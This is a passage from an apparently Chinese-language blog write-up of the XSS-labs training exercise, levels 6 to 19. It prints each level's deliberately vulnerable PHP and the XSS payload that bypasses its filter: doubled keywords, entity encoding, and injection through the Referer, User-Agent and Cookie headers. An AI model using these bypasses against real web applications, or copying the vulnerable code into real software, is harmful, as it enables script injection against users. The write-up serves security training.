<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>&quot;&gt;&lt;sCrIpt&gt;alert(/xss/)&lt;/ScRipt&gt;</code></p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><h4 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str =strtolower( $_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</code><strong>&#x2F;&#x2F;将script替换为空，以下同理</strong></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</code></p>
<p><code>$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</code></p>
<p><code>$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</code></p>
<p><code>$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level7.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>因为只会对整个字符串进行一次替换，所以我们可以使用<strong>双写绕过</strong></p>
<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/scrscriptipt&gt;</code></p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><h4 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p>
<p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p>
<p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p>
<p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p>
<p><code>$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</code></p>
<p><code>echo &#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level8.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=添加友情链接 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;?php</code></p>
<p> <code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code> <strong>&#x2F;&#x2F;在这里进行拼接</strong></p>
<p><code>?&gt;</code></p>
<p><code>&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到将大部分能用到的字符都做了破坏，看到友情链接那里，我们可以使用编码的方式绕过</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911155344507.png" alt="image-20220911155344507"></p>
<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;</code></p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><h4 id="源代码-6"><a href="#源代码-6" class="headerlink" title="源代码"></a>源代码</h4><pre><code>&lt;?php 

ini_set(&quot;display_errors&quot;, 0);

$str = strtolower($_GET[&quot;keyword&quot;]);

$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);

$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);

$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);

$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);

$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);

$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);

echo &#39;&lt;center&gt;

&lt;form action=level9.php method=GET&gt;

&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;

&lt;input type=submit name=submit value=添加友情链接 /&gt;

&lt;/form&gt;

&lt;/center&gt;&#39;;

?&gt;

&lt;?php

if(false===strpos($str7,&#39;http://&#39;))  

&#123;

 echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;

   &#125;

else

&#123;

 echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;

&#125;

?&gt;

&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;

&lt;?php 

echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;

?&gt;
</code></pre>
<p>if(false&#x3D;&#x3D;&#x3D;strpos($str7,’http:&#x2F;&#x2F;‘))  判断是否包含http:&#x2F;&#x2F;然后返回,这里还是可以通过编码来绕过</p>
<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h4><p><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</code></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911184437126.png" alt="image-20220911184437126"></p>
<p>可以看到有三个input标签，我们得测试出哪个表单可以突破</p>
<p>构造语句：<code>?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;</code></p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911185059255.png" alt="image-20220911185059255"></p>
<p>t_sort时，出现一个输入框，所以我们可以确定了</p>
<h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h4><p><code>?keyword=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
<h4 id="源代码-7"><a href="#源代码-7" class="headerlink" title="源代码"></a>源代码</h4><p>我们可以再看看源代码</p>
<p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str11 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到，我们的猜测没错,值得注意的是，这里会将&lt;&gt;替换为空，不能通过闭合input，引入新的标签来触发，只能通过事件来触发。</p>
<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><h4 id="源代码-8"><a href="#源代码-8" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str00 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>这一关卡和上面的一关非常的像多了一个input表单的信息，在服务器端还将请求头中的referer头的值赋给了str11这个变量，$_SERVER[‘HTTP_REFERER’]  #链接到当前页面的前一页面的 URL 地址，也就是说这里可以做点文章。在将变量值中的&lt;和&gt;删除之后就会插入到t_ref这个标签的<strong>value</strong>属性值中。而上一关的t_sort标签虽然也能接收并显示参数值，但是这个参数值是要用htmlspecialchars()函数处理的。</p>
<p>这里，我们就可以抓包，将数据包中的referer改为我们的恶意代码</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911190554237.png" alt="image-20220911190554237"></p>
<h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h4><p><code>referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191107302.png" alt="image-20220911191107302"></p>
<p>查看网页源码，我们发现，有一个和ua头一样的参数值，我们可以大胆猜测，这关测试点就在ua头，抓包改包试试</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191512274.png" alt="image-20220911191512274"></p>
<p>成功</p>
<h4 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h4><p><code>User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
<h4 id="源代码-9"><a href="#源代码-9" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str00 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>将keyword参数的值赋给了变量str</p>
<p>将t_sot参数的值赋给了变量str00，</p>
<p>将请求中User-Agent头的值赋给了变量str11,。</p>
<p>将变量str11的值中存在的&lt;和&gt;删除之后直接插入到了t_ua标签的value</p>
<p>属性值中。</p>
<p>在这里变量str和str00的值都是需要被htmlspecialchars()函数处理过</p>
<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>13关猜测还是与数据头有关</p>
<p><img src="https://img-blog.csdnimg.cn/2020072419061647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911203242098.png" alt="image-20220911203242098"></p>
<p>可以看到，是将cookies里的值放入了t_cook中，修改为恶意代码</p>
<h4 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h4><p><code>Cookie: user=1&quot; type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></p>
<h4 id="源代码-10"><a href="#源代码-10" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</code></p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str00 = $_GET[&quot;t_sort&quot;];</code></p>
<p><code>$str11=$_COOKIE[&quot;user&quot;];</code></p>
<p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p>
<p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form id=search&gt;</code></p>
<p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>修改iframe调用的文件来实现xss注入(但因为iframe调用的文件地址失效，无法进行测试</p>
<h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912135642044.png" alt="image-20220912135642044"></p>
<p>可以看到我们提交的src参数被插入到了<code>&lt;span&gt;</code>标签的<code>class</code>属性值中，但是前面还有<code>ng-include</code>这样的字符。</p>
<p><code>ng-include</code>是<code>angular js</code>中的东西，其作用相当于php的include函数。这里就是将<code>1.gif</code>这个文件给包含进来。</p>
<h4 id="ng-include相关知识点"><a href="#ng-include相关知识点" class="headerlink" title="ng-include相关知识点"></a>ng-include相关知识点</h4><p><strong>1、ng-include 指令用于包含外部的 HTML文件。</strong></p>
<p><strong>2、包含的内容将作为指定元素的子节点。</strong></p>
<p><strong>3、ng-include 属性的值可以是一个表达式，返回一个文件名。</strong></p>
<p><strong>4、默认情况下，包含的文件需要包含在同一个域名下。</strong></p>
<p><strong>特别值得注意的几点如下：</strong></p>
<p><strong>1.ng-include,如果单纯指定地址，必须要加引号</strong></p>
<p><strong>2.ng-include,加载外部html，script标签中的内容不执行</strong></p>
<p><strong>3.ng-include,加载外部html中含有style标签样式可以识别</strong></p>
<p>构造函数<br>?src&#x3D;’level1.php?name&#x3D;<img src=1 onerror=alert(1)>‘<br>因为这里参数值算是一个地址，所以需要添加引号。</p>
<p>但是level1.php不是一个php文件吗？</p>
<p>这里解释一下，这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。</p>
<h4 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h4><p><code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
<h4 id="源代码-11"><a href="#源代码-11" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;src&quot;];</code></p>
<p><code>echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912140337047.png" alt="image-20220912140337047"></p>
<p>可以看到，我们输入的值被插到了<center>标签中，我们尝试直接弹窗，发现很多字符被编码，来看看源代码</p>
<h4 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</code></p>
<p><code>$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</code></p>
<p><code>$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</code></p>
<p><code>$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);</code></p>
<p><code>echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到，将参数值中的script替换成&amp;nbsp;，将参数值中的空格也替换成&amp;nbsp;，将参数值中的&#x2F;符号替换成&amp;nbsp;</p>
<p>与我们的猜想一致</p>
<p>绕过思路：可以用回车来将它们分开。</p>
<p>而且这里&#x2F;符号也被编码了，所以我们需要的是一个不需要闭合的标签，比</p>
<p>如之前所用过的<img></p>
<img src="111" onerror=alert(‘xss’) >

<p>回车可以用url编码%0a表示</p>
<h4 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h4><p><code>&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;</code></p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912141605920.png" alt="image-20220912141605920"></p>
<p>可以看到提交的参数插入到了<embed>标签的src属性中，尝试直接弹窗，发现转义了很多符号。</p>
<p>尝试构造事件弹窗，可以看到这里的src没有用引号闭合，我们就不用管</p>
<h4 id="payload-13"><a href="#payload-13" class="headerlink" title="payload"></a>payload</h4><p><code>onclick=alert(&#39;xss&#39;)</code></p>
<pre><code>onmousedown=&#39;alert(1)&#39;
</code></pre>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912142104313.png" alt="image-20220912142104313"></p>
<h4 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code>·</p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到和我们的猜测一致</p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>与17关一致</p>
<h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>与之前一致，不过用了引号将src闭合，所以不能直接在后面添加语句，我们可以通过F12控制台添加</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/n3ym4r">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">XSS-labs通关笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">1.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">服务器端源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">1.3.</span> <span class="toc-text">level 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%BA%90%E4%BB%A3%E7%A0%81-1"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">服务器端源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">1.4.</span> <span class="toc-text">level 3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htmlspecialchars"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">htmlspecialchars ()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">1.5.</span> <span class="toc-text">level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-1"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">1.6.</span> <span class="toc-text">level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-2"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">1.7.</span> <span class="toc-text">level 6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-3"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-3"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">1.8.</span> <span class="toc-text">level 7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-4"><span class="toc-number">1.8.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-4"><span class="toc-number">1.8.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">1.9.</span> <span class="toc-text">level 8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-5"><span class="toc-number">1.9.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-5"><span class="toc-number">1.9.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-number">1.10.</span> <span class="toc-text">level 9</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-6"><span class="toc-number">1.10.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-6"><span class="toc-number">1.10.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-number">1.11.</span> <span class="toc-text">level 10</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-7"><span class="toc-number">1.11.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-7"><span class="toc-number">1.11.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-number">1.12.</span> <span class="toc-text">level 11</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-8"><span class="toc-number">1.12.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-8"><span class="toc-number">1.12.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-number">1.13.</span> <span class="toc-text">level 12</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-9"><span class="toc-number">1.13.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-9"><span class="toc-number">1.13.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-number">1.14.</span> <span class="toc-text">level 13</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-10"><span class="toc-number">1.14.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-10"><span class="toc-number">1.14.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-number">1.15.</span> <span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-number">1.16.</span> <span class="toc-text">level 15</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 